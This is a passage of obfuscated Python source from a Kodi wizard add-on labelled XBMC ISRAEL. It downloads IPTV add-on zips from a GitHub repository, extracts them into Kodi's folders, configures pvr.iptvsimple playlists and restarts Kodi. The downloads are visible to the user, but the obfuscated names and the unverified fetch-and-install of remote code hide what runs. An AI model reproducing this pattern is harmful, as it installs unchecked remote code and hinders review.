                OOO000OO00O0OOOOO =OOOO00O0O0OOO0000 .info ().getheader ('Content-Length').strip ()#line:5980
                OO0OO000O0000OO0O =True #line:5981
              except AttributeError :#line:5982
                    OO0OO000O0000OO0O =False #line:5983
              if OO0OO000O0000OO0O :#line:5985
                    OOO000OO00O0OOOOO =int (OOO000OO00O0OOOOO )#line:5986
              O0OO000O00O0000OO =0 #line:5988
              O0O00OOOO00OO00O0 =time .time ()#line:5989
              while True :#line:5990
                    OOO00OO000O0O0000 =OOOO00O0O0OOO0000 .read (8192 )#line:5991
                    if not OOO00OO000O0O0000 :#line:5992
                        sys .stdout .write ('\n')#line:5993
                        break #line:5994
                    O0OO000O00O0000OO +=len (OOO00OO000O0O0000 )#line:5996
                    O0OO0O0O0OO0OO00O .write (OOO00OO000O0O0000 )#line:5997
                    if not OO0OO000O0000OO0O :#line:5999
                        OOO000OO00O0OOOOO =O0OO000O00O0000OO #line:6000
                    if O0O0O000OOO00O0OO .iscanceled ():#line:6001
                       O0O0O000OOO00O0OO .close ()#line:6002
                       try :#line:6003
                        os .remove (O0OO00OOOO0OO0000 )#line:6004
                       except :#line:6005
                        pass #line:6006
                       break #line:6007
                    O00O0000O0000O0OO =float (O0OO000O00O0000OO )/OOO000OO00O0OOOOO #line:6008
                    O00O0000O0000O0OO =round (O00O0000O0000O0OO *100 ,2 )#line:6009
                    O00O0O00OOOO0000O =O0OO000O00O0000OO /(1024 *1024 )#line:6010
                    OO00O00OOO0OO0000 =OOO000OO00O0OOOOO /(1024 *1024 )#line:6011
                    OOOOOOOO0OO0OO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O0O00OOOO0000O ,'teal',OO00O00OOO0OO0000 )#line:6012
                    if (time .time ()-O0O00OOOO00OO00O0 )>0 :#line:6013
                      OOO00OOOOOO00O000 =O0OO000O00O0000OO /(time .time ()-O0O00OOOO00OO00O0 )#line:6014
                      OOO00OOOOOO00O000 =OOO00OOOOOO00O000 /1024 #line:6015
                    else :#line:6016
                     OOO00OOOOOO00O000 =0 #line:6017
                    O000OO0000000O0OO ='KB'#line:6018
                    if OOO00OOOOOO00O000 >=1024 :#line:6019
                       OOO00OOOOOO00O000 =OOO00OOOOOO00O000 /1024 #line:6020
                       O000OO0000000O0OO ='MB'#line:6021
                    if OOO00OOOOOO00O000 >0 and not O00O0000O0000O0OO ==100 :#line:6022
                        O0O00O0000O0OOO0O =(OOO000OO00O0OOOOO -O0OO000O00O0000OO )/OOO00OOOOOO00O000 #line:6023
                    else :#line:6024
                        O0O00O0000O0OOO0O =0 #line:6025
                    OOO0O0OO000O0000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00OOOOOO00O000 ,O000OO0000000O0OO )#line:6026
                    O0O0O000OOO00O0OO .update (int (O00O0000O0000O0OO ),"Downloading "+'iptv',OOOOOOOO0OO0OO000 ,OOO0O0OO000O0000O )#line:6028
              O00OOO0OO0OO00OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6031
              O0OO0O0O0OO0OO00O .close ()#line:6034
              extract .all (O0OO00OOOO0OO0000 ,O00OOO0OO0OO00OOO ,O0O0O000OOO00O0OO )#line:6035
              try :#line:6036
                os .remove (O0OO00OOOO0OO0000 )#line:6037
              except :#line:6039
                pass #line:6040
              O0O0O000OOO00O0OO .close ()#line:6041
def iptvkodi17_18 ():#line:6042
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:6045
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6046
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6047
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6051
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6052
              O0O00OOO00O00OOOO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6054
              OO0OOO0000000O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6055
              OOO000OOOOO000O0O =xbmcgui .DialogProgress ()#line:6056
              OOO000OOOOO000O0O .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6057
              OOOOO0OO00OO0O0OO =os .path .join (OO0OOO0000000O00O ,'isr.zip')#line:6058
              OO0000OO00O0OO0OO =urllib2 .Request (O0O00OOO00O00OOOO )#line:6059
              O0O0O000OO00OO00O =urllib2 .urlopen (OO0000OO00O0OO0OO )#line:6060
              OOO0O00O0OO000OOO =xbmcgui .DialogProgress ()#line:6062
              OOO0O00O0OO000OOO .create ("Downloading","Downloading "+'iptv')#line:6063
              OOO0O00O0OO000OOO .update (0 )#line:6064
              O0000OOO0OO0O0000 =open (OOOOO0OO00OO0O0OO ,'wb')#line:6066
              try :#line:6068
                OOOO0O000O00OOOO0 =O0O0O000OO00OO00O .info ().getheader ('Content-Length').strip ()#line:6069
                O0OOOO0O00O00O000 =True #line:6070
              except AttributeError :#line:6071
                    O0OOOO0O00O00O000 =False #line:6072
              if O0OOOO0O00O00O000 :#line:6074
                    OOOO0O000O00OOOO0 =int (OOOO0O000O00OOOO0 )#line:6075
              OO00O0O0OO0OOOOO0 =0 #line:6077
              O0OOOOO0O00O00OO0 =time .time ()#line:6078
              while True :#line:6079
                    O00OO0OO0OOOOOOO0 =O0O0O000OO00OO00O .read (8192 )#line:6080
                    if not O00OO0OO0OOOOOOO0 :#line:6081
                        sys .stdout .write ('\n')#line:6082
                        break #line:6083
                    OO00O0O0OO0OOOOO0 +=len (O00OO0OO0OOOOOOO0 )#line:6085
                    O0000OOO0OO0O0000 .write (O00OO0OO0OOOOOOO0 )#line:6086
                    if not O0OOOO0O00O00O000 :#line:6088
                        OOOO0O000O00OOOO0 =OO00O0O0OO0OOOOO0 #line:6089
                    if OOO0O00O0OO000OOO .iscanceled ():#line:6090
                       OOO0O00O0OO000OOO .close ()#line:6091
                       try :#line:6092
                        os .remove (OOOOO0OO00OO0O0OO )#line:6093
                       except :#line:6094
                        pass #line:6095
                       break #line:6096
                    OOO0O0O0OOO00O000 =float (OO00O0O0OO0OOOOO0 )/OOOO0O000O00OOOO0 #line:6097
                    OOO0O0O0OOO00O000 =round (OOO0O0O0OOO00O000 *100 ,2 )#line:6098
                    OOO0O0000O0OO000O =OO00O0O0OO0OOOOO0 /(1024 *1024 )#line:6099
                    OO0OO00OOO0OO0O00 =OOOO0O000O00OOOO0 /(1024 *1024 )#line:6100
                    O00000O00O00OOOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O0000O0OO000O ,'teal',OO0OO00OOO0OO0O00 )#line:6101
                    if (time .time ()-O0OOOOO0O00O00OO0 )>0 :#line:6102
                      OO000OO000OO00O00 =OO00O0O0OO0OOOOO0 /(time .time ()-O0OOOOO0O00O00OO0 )#line:6103
                      OO000OO000OO00O00 =OO000OO000OO00O00 /1024 #line:6104
                    else :#line:6105
                     OO000OO000OO00O00 =0 #line:6106
                    OO0OOOOOO0OO0OOO0 ='KB'#line:6107
                    if OO000OO000OO00O00 >=1024 :#line:6108
                       OO000OO000OO00O00 =OO000OO000OO00O00 /1024 #line:6109
                       OO0OOOOOO0OO0OOO0 ='MB'#line:6110
                    if OO000OO000OO00O00 >0 and not OOO0O0O0OOO00O000 ==100 :#line:6111
                        OO0OOO0O00OOOOOOO =(OOOO0O000O00OOOO0 -OO00O0O0OO0OOOOO0 )/OO000OO000OO00O00 #line:6112
                    else :#line:6113
                        OO0OOO0O00OOOOOOO =0 #line:6114
                    O0O0OOOO0OO0O0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000OO000OO00O00 ,OO0OOOOOO0OO0OOO0 )#line:6115
                    OOO0O00O0OO000OOO .update (int (OOO0O0O0OOO00O000 ),"Downloading "+'iptv',O00000O00O00OOOO0 ,O0O0OOOO0OO0O0O0O )#line:6117
              O0O0O000O000O0OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6120
              O0000OOO0OO0O0000 .close ()#line:6123
              extract .all (OOOOO0OO00OO0O0OO ,O0O0O000O000O0OOO ,OOO0O00O0OO000OOO )#line:6124
              wiz .kodi17Fix ()#line:6126
              try :#line:6128
                os .remove (OOOOO0OO00OO0O0OO )#line:6129
              except :#line:6131
                pass #line:6132
              OOO0O00O0OO000OOO .close ()#line:6133
              xbmc .sleep (5000 )#line:6135
              OO0OO00O00O00O000 ='התקנת לקוח טלוויזיה חיה'#line:6137
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO00O00O00O000 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6138
              resetkodi ()#line:6139
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6140
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6141
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6142
              O0O00OOO00O00OOOO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6143
              OO0OOO0000000O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6144
              OOO000OOOOO000O0O =xbmcgui .DialogProgress ()#line:6145
              OOO000OOOOO000O0O .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6146
              OOOOO0OO00OO0O0OO =os .path .join (OO0OOO0000000O00O ,'isr.zip')#line:6147
              OO0000OO00O0OO0OO =urllib2 .Request (O0O00OOO00O00OOOO )#line:6148
              O0O0O000OO00OO00O =urllib2 .urlopen (OO0000OO00O0OO0OO )#line:6149
              OOO0O00O0OO000OOO =xbmcgui .DialogProgress ()#line:6151
              OOO0O00O0OO000OOO .create ("Downloading","Downloading "+'iptv')#line:6152
              OOO0O00O0OO000OOO .update (0 )#line:6153
              O0000OOO0OO0O0000 =open (OOOOO0OO00OO0O0OO ,'wb')#line:6155
              try :#line:6157
                OOOO0O000O00OOOO0 =O0O0O000OO00OO00O .info ().getheader ('Content-Length').strip ()#line:6158
                O0OOOO0O00O00O000 =True #line:6159
              except AttributeError :#line:6160
                    O0OOOO0O00O00O000 =False #line:6161
              if O0OOOO0O00O00O000 :#line:6163
                    OOOO0O000O00OOOO0 =int (OOOO0O000O00OOOO0 )#line:6164
              OO00O0O0OO0OOOOO0 =0 #line:6166
              O0OOOOO0O00O00OO0 =time .time ()#line:6167
              while True :#line:6168
                    O00OO0OO0OOOOOOO0 =O0O0O000OO00OO00O .read (8192 )#line:6169
                    if not O00OO0OO0OOOOOOO0 :#line:6170
                        sys .stdout .write ('\n')#line:6171
                        break #line:6172
                    OO00O0O0OO0OOOOO0 +=len (O00OO0OO0OOOOOOO0 )#line:6174
                    O0000OOO0OO0O0000 .write (O00OO0OO0OOOOOOO0 )#line:6175
                    if not O0OOOO0O00O00O000 :#line:6177
                        OOOO0O000O00OOOO0 =OO00O0O0OO0OOOOO0 #line:6178
                    if OOO0O00O0OO000OOO .iscanceled ():#line:6179
                       OOO0O00O0OO000OOO .close ()#line:6180
                       try :#line:6181
                        os .remove (OOOOO0OO00OO0O0OO )#line:6182
                       except :#line:6183
                        pass #line:6184
                       break #line:6185
                    OOO0O0O0OOO00O000 =float (OO00O0O0OO0OOOOO0 )/OOOO0O000O00OOOO0 #line:6186
                    OOO0O0O0OOO00O000 =round (OOO0O0O0OOO00O000 *100 ,2 )#line:6187
                    OOO0O0000O0OO000O =OO00O0O0OO0OOOOO0 /(1024 *1024 )#line:6188
                    OO0OO00OOO0OO0O00 =OOOO0O000O00OOOO0 /(1024 *1024 )#line:6189
                    O00000O00O00OOOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O0000O0OO000O ,'teal',OO0OO00OOO0OO0O00 )#line:6190
                    if (time .time ()-O0OOOOO0O00O00OO0 )>0 :#line:6191
                      OO000OO000OO00O00 =OO00O0O0OO0OOOOO0 /(time .time ()-O0OOOOO0O00O00OO0 )#line:6192
                      OO000OO000OO00O00 =OO000OO000OO00O00 /1024 #line:6193
                    else :#line:6194
                     OO000OO000OO00O00 =0 #line:6195
                    OO0OOOOOO0OO0OOO0 ='KB'#line:6196
                    if OO000OO000OO00O00 >=1024 :#line:6197
                       OO000OO000OO00O00 =OO000OO000OO00O00 /1024 #line:6198
                       OO0OOOOOO0OO0OOO0 ='MB'#line:6199
                    if OO000OO000OO00O00 >0 and not OOO0O0O0OOO00O000 ==100 :#line:6200
                        OO0OOO0O00OOOOOOO =(OOOO0O000O00OOOO0 -OO00O0O0OO0OOOOO0 )/OO000OO000OO00O00 #line:6201
                    else :#line:6202
                        OO0OOO0O00OOOOOOO =0 #line:6203
                    O0O0OOOO0OO0O0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000OO000OO00O00 ,OO0OOOOOO0OO0OOO0 )#line:6204
                    OOO0O00O0OO000OOO .update (int (OOO0O0O0OOO00O000 ),"Downloading "+'iptv',O00000O00O00OOOO0 ,O0O0OOOO0OO0O0O0O )#line:6206
              O0O0O000O000O0OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6209
              O0000OOO0OO0O0000 .close ()#line:6212
              extract .all (OOOOO0OO00OO0O0OO ,O0O0O000O000O0OOO ,OOO0O00O0OO000OOO )#line:6213
              wiz .kodi17Fix ()#line:6214
              try :#line:6216
                os .remove (OOOOO0OO00OO0O0OO )#line:6217
              except :#line:6219
                pass #line:6220
              OOO0O00O0OO000OOO .close ()#line:6221
              xbmc .sleep (5000 )#line:6223
              OO0OO00O00O00O000 ='התקנת לקוח טלוויזיה חיה'#line:6225
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO00O00O00O000 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6226
              resetkodi ()#line:6227
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6229
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:6230
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6231
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6232
def iptvidanplus ():#line:6233
    O0O000O0OOO0OOO00 =xbmcaddon .Addon ('plugin.video.idanplus')#line:6234
    O0O000O0OOO0OOO00 .setSetting ('useIPTV','true')#line:6235
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:6236
    if KODIV >=17 and KODIV <18 :#line:6239
        O0O000OOOOO0O0000 ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:6241
        O00OO0OO00O000OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6242
        O00OO00OO0O00O0OO =xbmcgui .DialogProgress ()#line:6243
        O00OO00OO0O00O0OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6244
        O0OO0O0O0OOOO000O =os .path .join (PACKAGES ,'isr.zip')#line:6245
        OO000OO00O000O00O =urllib2 .Request (O0O000OOOOO0O0000 )#line:6246
        OO00O0O00O0OO00O0 =urllib2 .urlopen (OO000OO00O000O00O )#line:6247
        O00O00OO000O0OO0O =xbmcgui .DialogProgress ()#line:6249
        O00O00OO000O0OO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6250
        O00O00OO000O0OO0O .update (0 )#line:6251
        O0O000OOO00OO000O =open (O0OO0O0O0OOOO000O ,'wb')#line:6253
        try :#line:6255
          OO0000OO00OOOO00O =OO00O0O00O0OO00O0 .info ().getheader ('Content-Length').strip ()#line:6256
          O0O00OOO0OO0000OO =True #line:6257
        except AttributeError :#line:6258
              O0O00OOO0OO0000OO =False #line:6259
        if O0O00OOO0OO0000OO :#line:6261
              OO0000OO00OOOO00O =int (OO0000OO00OOOO00O )#line:6262
        O00O00OO0O0OOOO00 =0 #line:6264
        O00O0OOOO0000O0O0 =time .time ()#line:6265
        while True :#line:6266
              OOOO000O00OOO0000 =OO00O0O00O0OO00O0 .read (8192 )#line:6267
              if not OOOO000O00OOO0000 :#line:6268
                  sys .stdout .write ('\n')#line:6269
                  break #line:6270
              O00O00OO0O0OOOO00 +=len (OOOO000O00OOO0000 )#line:6272
              O0O000OOO00OO000O .write (OOOO000O00OOO0000 )#line:6273
              if not O0O00OOO0OO0000OO :#line:6275
                  OO0000OO00OOOO00O =O00O00OO0O0OOOO00 #line:6276
              if O00O00OO000O0OO0O .iscanceled ():#line:6277
                 O00O00OO000O0OO0O .close ()#line:6278
                 try :#line:6279
                  os .remove (O0OO0O0O0OOOO000O )#line:6280
                 except :#line:6281
                  pass #line:6282
                 break #line:6283
              OOOOO000O0O00O0O0 =float (O00O00OO0O0OOOO00 )/OO0000OO00OOOO00O #line:6284
              OOOOO000O0O00O0O0 =round (OOOOO000O0O00O0O0 *100 ,2 )#line:6285
              O0OO00O0O0O00OO0O =O00O00OO0O0OOOO00 /(1024 *1024 )#line:6286
              OOOOOO0O0O0000O00 =OO0000OO00OOOO00O /(1024 *1024 )#line:6287
              O000O0OO0000O0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO00O0O0O00OO0O ,'teal',OOOOOO0O0O0000O00 )#line:6288
              if (time .time ()-O00O0OOOO0000O0O0 )>0 :#line:6289
                O000O0O000OOOOOOO =O00O00OO0O0OOOO00 /(time .time ()-O00O0OOOO0000O0O0 )#line:6290
                O000O0O000OOOOOOO =O000O0O000OOOOOOO /1024 #line:6291
              else :#line:6292
               O000O0O000OOOOOOO =0 #line:6293
              O000OOOOO00OO0O00 ='KB'#line:6294
              if O000O0O000OOOOOOO >=1024 :#line:6295
                 O000O0O000OOOOOOO =O000O0O000OOOOOOO /1024 #line:6296
                 O000OOOOO00OO0O00 ='MB'#line:6297
              if O000O0O000OOOOOOO >0 and not OOOOO000O0O00O0O0 ==100 :#line:6298
                  OOO00OOO000OOOO00 =(OO0000OO00OOOO00O -O00O00OO0O0OOOO00 )/O000O0O000OOOOOOO #line:6299
              else :#line:6300
                  OOO00OOO000OOOO00 =0 #line:6301
              O00O0O00OO0OOO0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000O0O000OOOOOOO ,O000OOOOO00OO0O00 )#line:6302
              O00O00OO000O0OO0O .update (int (OOOOO000O0O00O0O0 ),O000O0OO0000O0O00 ,O00O0O00OO0OOO0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6304
        O000O0O0O00O0000O =xbmc .translatePath (os .path .join ('special://home/'))#line:6307
        O0O000OOO00OO000O .close ()#line:6310
        extract .all (O0OO0O0O0OOOO000O ,O000O0O0O00O0000O ,O00O00OO000O0OO0O )#line:6311
        try :#line:6315
          os .remove (O0OO0O0O0OOOO000O )#line:6316
        except :#line:6317
          pass #line:6318
        wiz .kodi17Fix ()#line:6319
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6320
        time .sleep (10 )#line:6321
        O0OO00OO0OOO00000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:6322
        O0OO00OO0OOO00000 .setSetting ('epgTimeShift','1.000000')#line:6323
        O0OO00OO0OOO00000 .setSetting ('m3uPathType','0')#line:6324
        O0OO00OO0OOO00000 .setSetting ('epgPathType','0')#line:6325
        O0OO00OO0OOO00000 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6326
        O0OO00OO0OOO00000 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:6327
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:6328
        resetkodi ()#line:6329
    if KODIV >=18 :#line:6332
        iptvkodi18idan ()#line:6334
        wiz .kodi17Fix ()#line:6335
        time .sleep (10 )#line:6337
        O0OO00OO0OOO00000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:6338
        O0OO00OO0OOO00000 .setSetting ('epgTimeShift','1.000000')#line:6339
        O0OO00OO0OOO00000 .setSetting ('m3uPathType','0')#line:6340
        O0OO00OO0OOO00000 .setSetting ('epgPathType','0')#line:6341
        O0OO00OO0OOO00000 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6342
        O0OO00OO0OOO00000 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:6343
        O00O00OOOOO00O0O0 ='הגדרת ערוצי עידן פלוס'#line:6344
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00OOOOO00O0O0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6345
        resetkodi ()#line:6346
def iptvsimpldown ():#line:6362
    O0OOOOO000O00OOOO =(IPTV18 )#line:6364
    O00O00O0O00000000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6365
    OOOO00O000O00OO0O =xbmcgui .DialogProgress ()#line:6366
    OOOO00O000O00OO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6367
    OOO0O0O0OOOOO000O =os .path .join (PACKAGES ,'isr.zip')#line:6368
    OOOOO00O000000000 =urllib2 .Request (O0OOOOO000O00OOOO )#line:6369
    OO0000OOOOOOOOO00 =urllib2 .urlopen (OOOOO00O000000000 )#line:6370
    OO0OOOO00O0OO0OO0 =xbmcgui .DialogProgress ()#line:6372
    OO0OOOO00O0OO0OO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6373
    OO0OOOO00O0OO0OO0 .update (0 )#line:6374
    O000O000OOOOO0OO0 =open (OOO0O0O0OOOOO000O ,'wb')#line:6376
    try :#line:6378
      O0O000OOO0OOOOO00 =OO0000OOOOOOOOO00 .info ().getheader ('Content-Length').strip ()#line:6379
      O000OO00OOO0O0000 =True #line:6380
    except AttributeError :#line:6381
          O000OO00OOO0O0000 =False #line:6382
    if O000OO00OOO0O0000 :#line:6384
          O0O000OOO0OOOOO00 =int (O0O000OOO0OOOOO00 )#line:6385
    O0000O00O0O0OO0O0 =0 #line:6387
    OO00O0OO000OOOOO0 =time .time ()#line:6388
    while True :#line:6389
          O0000O0O00O0OOOO0 =OO0000OOOOOOOOO00 .read (8192 )#line:6390
          if not O0000O0O00O0OOOO0 :#line:6391
              sys .stdout .write ('\n')#line:6392
              break #line:6393
          O0000O00O0O0OO0O0 +=len (O0000O0O00O0OOOO0 )#line:6395
          O000O000OOOOO0OO0 .write (O0000O0O00O0OOOO0 )#line:6396
          if not O000OO00OOO0O0000 :#line:6398
              O0O000OOO0OOOOO00 =O0000O00O0O0OO0O0 #line:6399
          if OO0OOOO00O0OO0OO0 .iscanceled ():#line:6400
             OO0OOOO00O0OO0OO0 .close ()#line:6401
             try :#line:6402
              os .remove (OOO0O0O0OOOOO000O )#line:6403
             except :#line:6404
              pass #line:6405
             break #line:6406
          OOO0000OO000O000O =float (O0000O00O0O0OO0O0 )/O0O000OOO0OOOOO00 #line:6407
          OOO0000OO000O000O =round (OOO0000OO000O000O *100 ,2 )#line:6408
          OO0OOOO0O0OOOOOOO =O0000O00O0O0OO0O0 /(1024 *1024 )#line:6409
          OO0O0O0O0OOOOOOOO =O0O000OOO0OOOOO00 /(1024 *1024 )#line:6410
          O00O0O00O0OO0000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OOOO0O0OOOOOOO ,'teal',OO0O0O0O0OOOOOOOO )#line:6411
          if (time .time ()-OO00O0OO000OOOOO0 )>0 :#line:6412
            OO00000OO0O000OO0 =O0000O00O0O0OO0O0 /(time .time ()-OO00O0OO000OOOOO0 )#line:6413
            OO00000OO0O000OO0 =OO00000OO0O000OO0 /1024 #line:6414
          else :#line:6415
           OO00000OO0O000OO0 =0 #line:6416
          O0OO000O0O0O00000 ='KB'#line:6417
          if OO00000OO0O000OO0 >=1024 :#line:6418
             OO00000OO0O000OO0 =OO00000OO0O000OO0 /1024 #line:6419
             O0OO000O0O0O00000 ='MB'#line:6420
          if OO00000OO0O000OO0 >0 and not OOO0000OO000O000O ==100 :#line:6421
              O0O00OOOO00000000 =(O0O000OOO0OOOOO00 -O0000O00O0O0OO0O0 )/OO00000OO0O000OO0 #line:6422
          else :#line:6423
              O0O00OOOO00000000 =0 #line:6424
          O000OOO0O00OO0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00000OO0O000OO0 ,O0OO000O0O0O00000 )#line:6425
          OO0OOOO00O0OO0OO0 .update (int (OOO0000OO000O000O ),O00O0O00O0OO0000O ,O000OOO0O00OO0O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6427
    O0O000O0O0O00OO0O =xbmc .translatePath (os .path .join ('special://home/'))#line:6430
    O000O000OOOOO0OO0 .close ()#line:6433
    extract .all (OOO0O0O0OOOOO000O ,O0O000O0O0O00OO0O ,OO0OOOO00O0OO0OO0 )#line:6434
    try :#line:6438
      os .remove (OOO0O0O0OOOOO000O )#line:6439
    except :#line:6440
      pass #line:6441
def testnotify ():#line:6442
	O000O0000OO00000O =wiz .workingURL (NOTIFICATION )#line:6443
	if O000O0000OO00000O ==True :#line:6444
		try :#line:6445
			OOOOOOO0O00000O00 ,O0OO0O0OOO0O00OO0 =wiz .splitNotify (NOTIFICATION )#line:6446
			if OOOOOOO0O00000O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6447
			if STARTP2 ()=='ok':#line:6448
				notify .notification (O0OO0O0OOO0O00OO0 ,True )#line:6449
		except Exception as OO0OOO0O0O0OO0OOO :#line:6450
			wiz .log ("Error on Notifications Window: %s"%str (OO0OOO0O0O0OO0OOO ),xbmc .LOGERROR )#line:6451
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6452
def testnotify2 ():#line:6453
	OO00OOOO0O0OOOO00 =wiz .workingURL (NOTIFICATION2 )#line:6454
	if OO00OOOO0O0OOOO00 ==True :#line:6455
		try :#line:6456
			O00OOOO0OO0OO00O0 ,OO0O0O00000OOO00O =wiz .splitNotify (NOTIFICATION2 )#line:6457
			if O00OOOO0OO0OO00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6458
			if STARTP2 ()=='ok':#line:6459
				notify .notification2 (OO0O0O00000OOO00O ,True )#line:6460
		except Exception as OO000O000OOO00OOO :#line:6461
			wiz .log ("Error on Notifications Window: %s"%str (OO000O000OOO00OOO ),xbmc .LOGERROR )#line:6462
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6463
def testnotify3 ():#line:6464
	O0O0O000OOOO0OOO0 =wiz .workingURL (NOTIFICATION3 )#line:6465
	if O0O0O000OOOO0OOO0 ==True :#line:6466
		try :#line:6467
			OO000OO0O0OOOO000 ,OO0OO0OOO0O000000 =wiz .splitNotify (NOTIFICATION3 )#line:6468
			if OO000OO0O0OOOO000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6469
			if STARTP2 ()=='ok':#line:6470
				notify .notification3 (OO0OO0OOO0O000000 ,True )#line:6471
		except Exception as O00OOO0OOO0OOOOO0 :#line:6472
			wiz .log ("Error on Notifications Window: %s"%str (O00OOO0OOO0OOOOO0 ),xbmc .LOGERROR )#line:6473
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6474
def wait ():#line:6475
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6476
def infobuild ():#line:6477
	OO00O0000O0O0O00O =wiz .workingURL (NOTIFICATION )#line:6478
